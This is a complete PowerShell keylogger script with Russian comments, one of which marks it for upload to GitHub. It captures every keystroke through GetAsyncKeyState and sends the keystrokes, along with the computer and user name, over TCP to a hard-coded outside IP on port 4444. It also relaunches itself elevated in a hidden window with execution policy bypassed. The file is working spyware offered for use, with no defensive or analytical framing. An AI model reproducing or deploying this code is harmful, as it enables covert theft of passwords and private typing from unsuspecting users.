# keylogger.ps1 - для загрузки на GitHub
$ServerIP = "89.22.229.54"
$ServerPort = 4444

function Send-Log {
    param([string]$Data)
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
        $socket = New-Object System.Net.Sockets.TcpClient($ServerIP, $ServerPort)
        $stream = $socket.GetStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        $socket.Close()
        return $true
    } catch {
        return $false
    }
}

function Start-Keylogger {
    $signature = @'
[DllImport("user32.dll")]
public static extern int GetAsyncKeyState(int vKey);
'@

    $API = Add-Type -MemberDefinition $signature -Name "WinAPI" -Namespace "KeyLogger" -PassThru
    
    # Отправляем информацию о системе
    $info = "[SYSTEM] $env:COMPUTERNAME\$env:USERNAME`n"
    Send-Log $info

    while ($true) {
        Start-Sleep -Milliseconds 10
        
        for ($key = 8; $key -le 255; $key++) {
            $state = $API::GetAsyncKeyState($key)
            
            if ($state -eq -32767) {
                $char = ""
                
                switch ($key) {
                    8 { $char = "[B]" }
                    13 { $char = "[E]`n" }
                    9 { $char = "[T]" }
                    27 { $char = "[C]" }
                    46 { $char = "[D]" }
                    37 { $char = "[L]" }
                    38 { $char = "[U]" }
                    39 { $char = "[R]" }
                    40 { $char = "[DO]" }
                    112 { $char = "[F1]" }
                    113 { $char = "[F2]" }
                    114 { $char = "[F3]" }
                    115 { $char = "[F4]" }
                    116 { $char = "[F5]" }
                    117 { $char = "[F6]" }
                    118 { $char = "[F7]" }
                    119 { $char = "[F8]" }
                    120 { $char = "[F9]" }
                    121 { $char = "[F10]" }
                    122 { $char = "[F11]" }
                    123 { $char = "[F12]" }
                }
                
                if ($char -eq "") {
                    $char = [char]$key
                }
                
                Send-Log $char
            }
        }
    }
}

# Запуск с повышенными правами
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    Start-Process powershell -ArgumentList $arguments -Verb RunAs -WindowStyle Hidden
    exit
}

Start-Keylogger